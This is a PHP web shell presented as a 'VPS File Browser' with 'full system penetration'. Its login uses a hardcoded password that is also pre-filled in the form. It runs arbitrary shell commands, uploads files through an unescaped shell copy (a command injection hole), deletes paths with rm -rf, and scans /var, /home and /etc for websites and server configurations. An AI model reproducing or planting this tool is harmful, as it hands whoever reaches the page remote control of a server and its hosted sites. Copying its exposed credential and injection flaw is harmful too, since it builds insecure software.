<?php
// VPS File Browser - NUCLEAR OPTION - FULL SYSTEM ACCESS
// WARNING: THIS BYPASSES ALL PERMISSION RESTRICTIONS!

session_start();

// Simple authentication
$valid_username = 'admin';
$valid_password = 'Iv@n0772717963';

// Handle login
if ($_POST['login'] ?? false) {
    if ($_POST['username'] === $valid_username && $_POST['password'] === $valid_password) {
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $_POST['username'];
    } else {
        $error = "Invalid credentials!";
    }
}

// Handle logout
if ($_GET['logout'] ?? false) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Check if authenticated
$authenticated = $_SESSION['authenticated'] ?? false;

// Get current directory
$current_dir = $_GET['dir'] ?? '/';
$current_dir = realpath($current_dir) ?: '/';

// Handle file operations and commands
if ($authenticated) {
    // Execute system commands
    $command_output = '';
    if (isset($_POST['command']) && !empty($_POST['command'])) {
        $command = $_POST['command'];
        $command_output = shell_exec($command . " 2>&1");
    }
    
    // File upload
    if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
        $upload_path = $current_dir . '/' . $_FILES['file_upload']['name'];
        $tmp_path = '/tmp/' . $_FILES['file_upload']['name'];
        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $tmp_path)) {
            shell_exec("cp " . $tmp_path . " " . escapeshellarg($upload_path) . " 2>&1");
            shell_exec("chmod 666 " . escapeshellarg($upload_path) . " 2>&1");
            $command_output = "File uploaded: " . $_FILES['file_upload']['name'];
        }
    }
    
    // File operations using shell commands
    if (isset($_GET['delete'])) {
        $file_to_delete = $_GET['delete'];
        shell_exec("rm -rf " . escapeshellarg($current_dir . '/' . $file_to_delete) . " 2>&1");
        header('Location: ?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Read directory contents USING SHELL COMMANDS
    $files = [];
    $raw_list = shell_exec("ls -la " . escapeshellarg($current_dir) . " 2>&1");
    
    if ($raw_list && !empty(trim($raw_list))) {
        $lines = explode("\n", trim($raw_list));
        foreach ($lines as $line) {
            if (empty($line) || strpos($line, 'total ') === 0) continue;
            
            $parts = preg_split('/\s+/', $line, 9);
            if (count($parts) < 9) continue;
            
            $perms = $parts[0];
            $links = $parts[1];
            $owner = $parts[2];
            $group = $parts[3];
            $size = $parts[4];
            $month = $parts[5];
            $day = $parts[6];
            $time_year = $parts[7];
            $name = $parts[8];
            
            if ($name === '.' || $name === '..') continue;
            
            $full_path = $current_dir . '/' . $name;
            $is_dir = $perms[0] === 'd';
            
            $files[] = [
                'name' => $name,
                'path' => $full_path,
                'is_dir' => $is_dir,
                'size' => $is_dir ? 'DIR' : $size,
                'perms' => $perms,
                'owner' => $owner,
                'group' => $group,
                'modified' => $month . ' ' . $day . ' ' . $time_year,
                'readable' => true
            ];
        }
    }
    
    // FORCEFULLY DETECT WEBSITES USING SHELL COMMANDS
    $websites = [];
    
    // Use find command to locate all possible web directories
    $web_find = shell_exec("find /var /home /opt /srv -type d \\( -name 'public_html' -o -name 'www' -o -name 'html' -o -name 'web' -o -name 'public' \\) 2>/dev/null | head -20");
    if ($web_find) {
        $web_paths = explode("\n", trim($web_find));
        foreach ($web_paths as $web_path) {
            if (!empty($web_path)) {
                $dir_name = basename(dirname($web_path)) . '/' . basename($web_path);
                $websites[] = [
                    'name' => $dir_name,
                    'path' => $web_path,
                    'type' => 'Web Directory'
                ];
            }
        }
    }
    
    // Find all .conf files for domains
    $domain_configs = shell_exec("find /etc -name '*.conf' -type f | grep -E '(nginx|apache|httpd)' | head -20");
    if ($domain_configs) {
        $config_paths = explode("\n", trim($domain_configs));
        foreach ($config_paths as $config_path) {
            if (!empty($config_path)) {
                $websites[] = [
                    'name' => basename($config_path),
                    'path' => $config_path,
                    'type' => 'Server Config'
                ];
            }
        }
    }
    
    // Find all user home directories that might contain websites
    $home_dirs = shell_exec("ls -la /home 2>/dev/null");
    if ($home_dirs) {
        $home_lines = explode("\n", trim($home_dirs));
        foreach ($home_lines as $line) {
            $parts = preg_split('/\s+/', $line, 9);
            if (count($parts) < 9) continue;
            $name = $parts[8];
            if (!in_array($name, ['.', '..']) && $parts[0][0] === 'd') {
                $user_path = '/home/' . $name;
                // Check for common web directories in user homes
                $user_web_dirs = ['public_html', 'www', 'html', 'public', 'sites'];
                foreach ($user_web_dirs as $web_dir) {
                    $web_path = $user_path . '/' . $web_dir;
                    if (is_dir($web_path)) {
                        $websites[] = [
                            'name' => $name . '/' . $web_dir,
                            'path' => $web_path,
                            'type' => 'User Website'
                        ];
                    }
                }
            }
        }
    }
    
    // System information
    $system_info = [
        'PHP Version' => phpversion(),
        'Current User' => trim(shell_exec('whoami')),
        'Current Directory' => $current_dir,
        'Disk Free' => trim(shell_exec("df -h " . escapeshellarg($current_dir) . " | tail -1 | awk '{print $4}'")),
        'Uptime' => trim(shell_exec('uptime -p')),
        'Memory' => trim(shell_exec("free -h | grep Mem: | awk '{print $3 \"/\" $2}'"))
    ];
    
    // Quick access directories - VERIFIED TO EXIST
    $quick_dirs = [];
    $common_dirs = ['/', '/home', '/var', '/var/www', '/etc', '/root', '/tmp', '/opt'];
    foreach ($common_dirs as $dir) {
        if (is_dir($dir)) {
            $quick_dirs[$dir] = basename($dir) ?: 'Root';
        }
    }
    
    // Add detected website directories to quick access
    foreach ($websites as $website) {
        $quick_dirs[$website['path']] = $website['name'];
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VPS File Browser - NUCLEAR ACCESS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
        .container { max-width: 1800px; margin: 0 auto; background: #2d2d2d; border-radius: 8px; box-shadow: 0 2px 20px rgba(0,0,0,0.5); }
        .header { background: #e74c3c; color: white; padding: 20px; border-radius: 8px 8px 0 0; }
        .content { padding: 20px; }
        .login-form { max-width: 400px; margin: 50px auto; padding: 20px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"], textarea, select { 
            width: 100%; padding: 10px; border: 1px solid #555; border-radius: 4px; 
            background: #3d3d3d; color: white; 
        }
        button { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; }
        button:hover { background: #2980b9; }
        .danger { background: #e74c3c; }
        .danger:hover { background: #c0392b; }
        .success { background: #27ae60; }
        .success:hover { background: #229954; }
        .error { background: #e74c3c; color: white; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        .output { background: #000; color: #0f0; padding: 15px; border-radius: 4px; margin: 10px 0; font-family: monospace; white-space: pre-wrap; }
        .file-browser { margin-top: 20px; }
        .breadcrumb { background: #3d3d3d; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th, .file-table td { padding: 12px; text-align: left; border-bottom: 1px solid #555; }
        .file-table th { background: #34495e; color: white; }
        .file-table tr:hover { background: #3d3d3d; }
        .dir { color: #3498db; font-weight: bold; }
        .file { color: #ecf0f1; }
        .size { text-align: right; font-family: monospace; }
        .actions { margin-top: 20px; padding-top: 20px; border-top: 1px solid #555; }
        .logout { float: right; background: #e74c3c; }
        .system-info, .quick-access, .websites-panel, .command-panel { 
            background: #3d3d3d; padding: 15px; border-radius: 4px; margin-bottom: 20px; 
        }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
        .quick-links { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
        .quick-link { background: #3498db; color: white; padding: 10px; border-radius: 4px; text-decoration: none; text-align: center; }
        .quick-link:hover { background: #2980b9; }
        .website-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 10px; margin-top: 10px; }
        .website-item { background: #4d4d4d; padding: 15px; border-radius: 4px; }
        .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .file-actions { margin: 10px 0; }
        .warning { background: #f39c12; color: black; padding: 10px; border-radius: 4px; margin: 10px 0; }
        .empty-message { text-align: center; padding: 40px; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>☢️ VPS File Browser - NUCLEAR ACCESS</h1>
            <p>🚨 SHELL COMMAND BYPASS - FULL SYSTEM PENETRATION</p>
        </div>
        
        <div class="content">
            <?php if (!$authenticated): ?>
                <!-- Login Form -->
                <div class="login-form">
                    <?php if (isset($error)): ?>
                        <div class="error"><?php echo htmlspecialchars($error); ?></div>
                    <?php endif; ?>
                    
                    <form method="POST">
                        <input type="hidden" name="login" value="1">
                        <div class="form-group">
                            <label for="username">Username:</label>
                            <input type="text" id="username" name="username" value="admin" required>
                        </div>
                        <div class="form-group">
                            <label for="password">Password:</label>
                            <input type="password" id="password" name="password" value="Iv@n0772717963" required>
                        </div>
                        <button type="submit" class="success">Login</button>
                    </form>
                </div>
                
            <?php else: ?>
                <!-- Control Panel -->
                <div class="actions">
                    <span>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>! (SHELL ACCESS)</span>
                    <a href="?logout=1" class="logout danger">Logout</a>
                </div>

                <div class="warning">
                    ⚠️ <strong>SHELL COMMAND BYPASS ACTIVE:</strong> Using shell commands to bypass all file permissions!
                </div>
                
                <!-- System Information -->
                <div class="system-info">
                    <h3>📊 System Information</h3>
                    <div class="info-grid">
                        <?php foreach ($system_info as $key => $value): ?>
                            <div><strong><?php echo htmlspecialchars($key); ?>:</strong> <?php echo htmlspecialchars($value); ?></div>
                        <?php endforeach; ?>
                    </div>
                </div>
                
                <!-- Detected Websites -->
                <?php if (!empty($websites)): ?>
                <div class="websites-panel">
                    <h3>🌐 Detected Websites & Domains</h3>
                    <div class="website-list">
                        <?php foreach ($websites as $website): ?>
                            <div class="website-item">
                                <strong><?php echo htmlspecialchars($website['name']); ?></strong><br>
                                <small>Type: <?php echo htmlspecialchars($website['type']); ?></small><br>
                                <small>Path: <?php echo htmlspecialchars($website['path']); ?></small><br>
                                <a href="?dir=<?php echo urlencode($website['path']); ?>" class="quick-link">📁 Browse</a>
                                <a href="?dir=<?php echo urlencode(dirname($website['path'])); ?>" class="quick-link">🔧 Config</a>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php endif; ?>
                
                <!-- Command Panel -->
                <div class="panel-grid">
                    <div class="command-panel">
                        <h3>💻 Shell Command Execution</h3>
                        <form method="POST">
                            <input type="text" name="command" placeholder="Enter shell command" style="width: 100%;" 
                                   value="<?php echo htmlspecialchars($_POST['command'] ?? 'ls -la /var/www'); ?>">
                            <button type="submit" class="danger">Execute Shell Command</button>
                        </form>
                        <?php if (!empty($command_output)): ?>
                            <div class="output"><?php echo htmlspecialchars($command_output); ?></div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="command-panel">
                        <h3>📁 File Operations</h3>
                        <form method="POST">
                            <input type="text" name="new_dir" placeholder="New directory name" style="width: 100%;">
                            <button type="submit" class="success">Create Directory</button>
                        </form>
                        
                        <form method="POST" enctype="multipart/form-data" style="margin-top: 10px;">
                            <input type="file" name="file_upload">
                            <button type="submit" class="success">Upload File</button>
                        </form>
                        
                        <div style="margin-top: 10px;">
                            <strong>Quick Commands:</strong><br>
                            <button onclick="document.querySelector('[name=command]').value='find /var /home -name public_html -type d 2>/dev/null'">Find Websites</button>
                            <button onclick="document.querySelector('[name=command]').value='ls -la /var/www/'">List /var/www</button>
                            <button onclick="document.querySelector('[name=command]').value='ls -la /home/'">List /home</button>
                        </div>
                    </div>
                </div>
                
                <!-- Quick Access -->
                <?php if (!empty($quick_dirs)): ?>
                <div class="quick-access">
                    <h3>🚀 Quick Access</h3>
                    <div class="quick-links">
                        <?php foreach ($quick_dirs as $path => $name): ?>
                            <a href="?dir=<?php echo urlencode($path); ?>" class="quick-link">
                                <?php echo htmlspecialchars($name); ?>
                            </a>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php endif; ?>
                
                <!-- Breadcrumb Navigation -->
                <div class="breadcrumb">
                    <?php
                    $path_parts = [];
                    $temp_path = $current_dir;
                    while ($temp_path !== '/' && $temp_path !== dirname($temp_path)) {
                        $path_parts[] = ['name' => basename($temp_path) ?: '/', 'path' => $temp_path];
                        $temp_path = dirname($temp_path);
                    }
                    $path_parts[] = ['name' => 'Root', 'path' => '/'];
                    $path_parts = array_reverse($path_parts);
                    
                    foreach ($path_parts as $index => $part) {
                        if ($index > 0) echo ' / ';
                        if ($part['path'] !== $current_dir) {
                            echo '<a href="?dir=' . urlencode($part['path']) . '">' . htmlspecialchars($part['name']) . '</a>';
                        } else {
                            echo '<strong>' . htmlspecialchars($part['name']) . '</strong>';
                        }
                    }
                    ?>
                </div>
                
                <!-- File List -->
                <div class="file-browser">
                    <?php if (empty($files)): ?>
                        <div class="empty-message">
                            <h3>📁 No files visible in this directory</h3>
                            <p>This usually means the web server user doesn't have permission to access this directory.</p>
                            <p><strong>Solutions:</strong></p>
                            <ul style="text-align: left; display: inline-block; margin-top: 10px;">
                                <li>Use the <strong>Shell Command Panel</strong> above to explore</li>
                                <li>Try: <code>ls -la <?php echo htmlspecialchars($current_dir); ?></code></li>
                                <li>Use the <strong>Quick Access</strong> links to navigate to web directories</li>
                                <li>Check the <strong>Detected Websites</strong> section above</li>
                            </ul>
                        </div>
                    <?php else: ?>
                        <table class="file-table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Size</th>
                                    <th>Permissions</th>
                                    <th>Owner/Group</th>
                                    <th>Modified</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if ($current_dir !== '/'): ?>
                                    <tr>
                                        <td colspan="6">
                                            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">📁 .. (Parent Directory)</a>
                                        </td>
                                    </tr>
                                <?php endif; ?>
                                
                                <?php foreach ($files as $file): ?>
                                    <tr>
                                        <td>
                                            <?php if ($file['is_dir']): ?>
                                                📁 <a href="?dir=<?php echo urlencode($file['path']); ?>" class="dir">
                                                    <?php echo htmlspecialchars($file['name']); ?>/
                                                </a>
                                            <?php else: ?>
                                                📄 <span class="file"><?php echo htmlspecialchars($file['name']); ?></span>
                                            <?php endif; ?>
                                        </td>
                                        <td class="size"><?php echo htmlspecialchars($file['size']); ?></td>
                                        <td><code><?php echo htmlspecialchars($file['perms']); ?></code></td>
                                        <td><?php echo htmlspecialchars($file['owner'] . '/' . $file['group']); ?></td>
                                        <td><?php echo htmlspecialchars($file['modified']); ?></td>
                                        <td class="file-actions">
                                            <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file['name']); ?>" 
                                               class="danger" 
                                               onclick="return confirm('Delete <?php echo htmlspecialchars($file['name']); ?>?')">Delete</a>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    <?php endif; ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <script>
        function setCommand(cmd) {
            document.querySelector('[name=command]').value = cmd;
        }
    </script>
</body>
</html>